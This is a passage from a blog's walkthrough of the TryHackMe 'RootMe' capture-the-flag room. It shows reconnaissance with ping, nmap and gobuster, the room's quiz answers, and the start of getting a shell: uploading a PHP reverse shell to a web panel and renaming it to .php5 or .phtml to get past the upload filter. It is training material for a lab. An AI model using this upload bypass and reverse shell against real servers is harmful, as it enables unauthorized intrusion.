@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>RootMe &gt;_ - Sumit&#39;s Blog</title><meta name="Description" content="This is my cool site"><meta property="og:title" content="RootMe &gt;_" />
+<meta property="og:description" content="&ldquo;This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation.&rdquo;
+Intro This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation.
+Room Link: https://tryhackme.com/room/rrootme ⚠️Tools used: &gt; Ping &gt; Nmap &gt; Netcat &gt; Gobuster &gt; Python # Task 1 Deploy the machine Connect to TryHackMe network through openvpn and deploy the machine." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sumit2011.github.io/rootme/" /><meta property="og:image" content="https://sumit2011.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-28T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-09-28T00:00:00+00:00" /><meta property="og:site_name" content="Sumit&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://sumit2011.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="RootMe &gt;_"/>
+<meta name="twitter:description" content="&ldquo;This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation.&rdquo;
+Intro This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation.
+Room Link: https://tryhackme.com/room/rrootme ⚠️Tools used: &gt; Ping &gt; Nmap &gt; Netcat &gt; Gobuster &gt; Python # Task 1 Deploy the machine Connect to TryHackMe network through openvpn and deploy the machine."/>
+<meta name="twitter:site" content="@_su__mit___"/>
+<meta name="application-name" content="Sumit&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Sumit&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://sumit2011.github.io/rootme/" /><link rel="next" href="https://sumit2011.github.io/oops/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "RootMe \u003e_",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/sumit2011.github.io\/rootme\/"
+        },"genre": "posts","wordcount":  1132 ,
+        "url": "https:\/\/sumit2011.github.io\/rootme\/","datePublished": "2023-09-28T00:00:00+00:00","dateModified": "2023-09-28T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "sumit"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sumit&#39;s Blog"><span class="header-title-pre">👀</span>DSA Blogs</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About me </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sumit&#39;s Blog"><span class="header-title-pre">👀</span>DSA Blogs</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">RootMe &gt;_</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>sumit</a>
+</span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="28-09-2023">28-09-2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1132 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p>&ldquo;This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation.&rdquo;</p>
+<!-- <a class="lightgallery" href="../home.png" title="Hello Friend" data-thumbnail="../home.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="../home.png"
+            data-srcset="../home.png, ../home.png 1.5x, ../home.png 2x"
+            data-sizes="auto"
+            alt="Hello Friend" />
+    </a> -->
+<h1 id="intro">Intro</h1>
+<p>This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation.</p>
+<blockquote>
+<p>Room Link: <a href="https://tryhackme.com/room/rrootme" target="_blank" rel="noopener noreffer">https://tryhackme.com/room/rrootme</a>
+</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>⚠️Tools used:</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&gt; Ping</td>
+</tr>
+<tr>
+<td>&gt; Nmap</td>
+</tr>
+<tr>
+<td>&gt; Netcat</td>
+</tr>
+<tr>
+<td>&gt; Gobuster</td>
+</tr>
+<tr>
+<td>&gt; Python</td>
+</tr>
+</tbody>
+</table>
+<h1 id="-task-1-deploy-the-machine"># Task 1 Deploy the machine</h1>
+<p>Connect to TryHackMe network through openvpn and deploy the machine.
+Click on the <code>start machine</code> button.
+Wait for few second after this it will show an ip addr.<br>
+My ip: <code>10.10.156.27</code><br>
+In your case ip may be different.</p>
+<h1 id="-task-2-reconnaissance"># Task 2 Reconnaissance</h1>
+<h1 id="ping-scan">ping scan</h1>
+<p>Check whether the host is reachable or not across the ip address.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ping</span> <span class="mf">10.10.156.27</span>
+</span></span><span class="line"><span class="cl"><span class="n">PING</span> <span class="mf">10.10.156.27</span> <span class="p">(</span><span class="mf">10.10.156.27</span><span class="p">)</span> <span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span> <span class="n">bytes</span> <span class="n">of</span> <span class="n">data</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mf">10.10.156.27</span><span class="o">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">63</span> <span class="n">time</span><span class="o">=</span><span class="mi">263</span> <span class="n">ms</span>
+</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mf">10.10.156.27</span><span class="o">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">3</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">63</span> <span class="n">time</span><span class="o">=</span><span class="mi">232</span> <span class="n">ms</span>
+</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mf">10.10.156.27</span><span class="o">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">4</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">63</span> <span class="n">time</span><span class="o">=</span><span class="mi">297</span> <span class="n">ms</span>
+</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mf">10.10.156.27</span><span class="o">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">5</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">63</span> <span class="n">time</span><span class="o">=</span><span class="mi">286</span> <span class="n">ms</span>
+</span></span><span class="line"><span class="cl"><span class="o">^</span><span class="n">C</span>
+</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="mf">10.10.156.27</span> <span class="n">ping</span> <span class="n">statistics</span> <span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="mi">5</span> <span class="n">packets</span> <span class="n">transmitted</span><span class="p">,</span> <span class="mi">4</span> <span class="n">received</span><span class="p">,</span> <span class="mi">20</span><span class="o">%</span> <span class="n">packet</span> <span class="n">loss</span><span class="p">,</span> <span class="n">time</span> <span class="mi">4008</span><span class="n">ms</span>
+</span></span><span class="line"><span class="cl"><span class="n">rtt</span> <span class="n">min</span><span class="o">/</span><span class="n">avg</span><span class="o">/</span><span class="n">max</span><span class="o">/</span><span class="n">mdev</span> <span class="o">=</span> <span class="mf">231.753</span><span class="o">/</span><span class="mf">269.480</span><span class="o">/</span><span class="mf">297.297</span><span class="o">/</span><span class="mf">24.998</span> <span class="n">ms</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Host is reachable now go to the site, copy paste the ip into your address bar of your browser.</p>
+<p>Now view the page source:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;css/home.css&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;js/maquina_de_escrever.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>HackIT - Home<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;main-div&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;title&#34;</span><span class="p">&gt;</span>root@rootme:~#<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;description&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            Can you root me?
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c">&lt;!--  --&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">titulo</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;.title&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">typeWrite</span><span class="p">(</span><span class="nx">titulo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We get nothing important here.
+Now do the nmap scan.</p>
+<h1 id="nmap-scan">nmap scan</h1>
+<p>Run nmap scan to search which ports are open and much more. First create the nmap folder and Run the following command.<br>
+command:<code>mkdir nmap</code><br>
+command:<code>cd nmap</code><br>
+command:<code>nmap -sV -oN nmap/rootme 10.10.156.27</code></p>
+<p>command breakdown:</p>
+<ul>
+<li>-sV : Version Detection.</li>
+<li>-oN : store the output into nmap folder.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp"># Nmap 7.94 scan initiated Wed Sep 27 23:49:49 2023 as: nmap -sV -oN nmap/rootm\
+</span></span></span><span class="line"><span class="cl"><span class="cp">e 10.10.156.27
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.156.27</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span> <span class="n">is</span> <span class="nf">up</span> <span class="p">(</span><span class="mf">0.37</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+</span></span><span class="line"><span class="cl"><span class="n">Not</span> <span class="nl">shown</span><span class="p">:</span> <span class="mi">998</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="nf">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">7.6</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4u</span><span class="n">buntu0</span><span class="mf">.3</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.</span>\
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.29</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">Service</span> <span class="nl">Info</span><span class="p">:</span> <span class="nl">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="nl">CPE</span><span class="p">:</span> <span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="nl">https</span><span class="p">:</span><span class="c1">//nma\
+</span></span></span><span class="line"><span class="cl"><span class="c1">p.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp"># Nmap done at Thu Sep 28 00:03:21 2023 -- 1 IP address (1 host up) scanned in \
+</span></span></span><span class="line"><span class="cl"><span class="cp">811.92 seconds
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Port 22- ssh</p>
+<p>Here we are able to see that our SSH port is open. This port isn&rsquo;t too vulnerable unless we have found someones credentials. Se we will not mess with it.</p>
+<p>Port 80- http</p>
+<p>It is here were we find a webservice. Lets poke around and see if there is anyting interesting.</p>
+<h1 id="qna">QnA:</h1>
+<ol>
+<li>
+<p>Scan the machine, how many ports are open?<br>
+<code>ans: 2</code></p>
+</li>
+<li>
+<p>What version pf Apache is running?<br>
+<code>ans: 2.4.29</code></p>
+</li>
+<li>
+<p>What service is running on port 22?<br>
+<code>ans: ssh</code></p>
+</li>
+</ol>
+<h1 id="finding-hidden-directories">Finding hidden directories</h1>
+<p>So there may be some hidden directories, we are going to use gobuster tool for that. Run the following command.<br>
+command:<code>gobuster dir -u http://10.10.156.27/ -w /home//sumit/ctf/directory-list-2.3-medium.txt</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">sumit</span><span class="err">㉿</span><span class="n">mr</span><span class="o">-</span><span class="n">nob0dy</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">ctf</span><span class="o">/</span><span class="n">tryhackme</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="n">gobuster</span> <span class="n">dir</span> <span class="o">-</span><span class="n">u</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//10.10.156.27/ -w /home//sumit/ctf/directory-list-2.3-medium.txt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Gobuster</span> <span class="n">v3</span><span class="mf">.6</span>
+</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">OJ</span> <span class="nf">Reeves</span> <span class="p">(</span><span class="err">@</span><span class="n">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="nf">Mehlmauer</span> <span class="p">(</span><span class="err">@</span><span class="n">firefart</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nl">Url</span><span class="p">:</span>                     <span class="nl">http</span><span class="p">:</span><span class="c1">//10.10.156.27/
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nl">Method</span><span class="p">:</span>                  <span class="n">GET</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nl">Threads</span><span class="p">:</span>                 <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nl">Wordlist</span><span class="p">:</span>                <span class="o">/</span><span class="n">home</span><span class="c1">//sumit/ctf/directory-list-2.3-medium.txt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Negative</span> <span class="n">Status</span> <span class="nl">codes</span><span class="p">:</span>   <span class="mi">404</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="nl">Agent</span><span class="p">:</span>              <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.6</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nl">Timeout</span><span class="p">:</span>                 <span class="mi">10</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="n">gobuster</span> <span class="n">in</span> <span class="n">directory</span> <span class="n">enumeration</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nf">uploads</span>              <span class="p">(</span><span class="nl">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="nl">Size</span><span class="p">:</span> <span class="mi">314</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//10.10.156.27/uploads/]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">/</span><span class="nf">css</span>                  <span class="p">(</span><span class="nl">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="nl">Size</span><span class="p">:</span> <span class="mi">310</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//10.10.156.27/css/]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">/</span><span class="nf">js</span>                   <span class="p">(</span><span class="nl">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="nl">Size</span><span class="p">:</span> <span class="mi">309</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//10.10.156.27/js/]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">/</span><span class="nf">panel</span>                <span class="p">(</span><span class="nl">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="nl">Size</span><span class="p">:</span> <span class="mi">312</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//10.10.156.27/panel/]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">Progress</span><span class="p">:</span> <span class="mi">8609</span> <span class="o">/</span> <span class="mi">220561</span> <span class="p">(</span><span class="mf">3.90</span><span class="o">%</span><span class="p">)</span><span class="o">^</span><span class="n">C</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Keyboard</span> <span class="n">interrupt</span> <span class="n">detected</span><span class="p">,</span> <span class="n">terminating</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Progress</span><span class="p">:</span> <span class="mi">8609</span> <span class="o">/</span> <span class="mi">220561</span> <span class="p">(</span><span class="mf">3.90</span><span class="o">%</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We found some directories like uploads and panel.</p>
+<h1 id="qna-1">QnA:</h1>
+<ol start="4">
+<li>Find directories on the web server using the GoBuster tool.<br>
+<code>ans: no answer needed</code></li>
+<li>What is the hidden directory?<br>
+<code>ans: /panel/</code></li>
+</ol>
+<h1 id="-task-3-getting-a-shell"># Task 3 Getting a shell</h1>
+<p>Try to reach <code>http://$IP/panel/</code>
+we have a section to upload a file, so we have a chance to get the reverse shell so try to upload reverse-shell-php file which is available on the internet. Change the ip address by your ip and change the port in the php file. Now upload the file.</p>
+<a class="lightgallery" href="../panel1.png" title="home page" data-thumbnail="../panel1.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="../panel1.png"
+            data-srcset="../panel1.png, ../panel1.png 1.5x, ../panel1.png 2x"
+            data-sizes="auto"
+            alt="home page" />
+    </a>
+<p>We get some error, we can&rsquo;t upload php file so we have to find another way to upload file.
+Now try to change the file extension from php to <code>php5</code> or <code>phtml</code> etc.<br>
+command:<code>mv php-reverse-shell.php php-reverse-shell.php5</code><br>
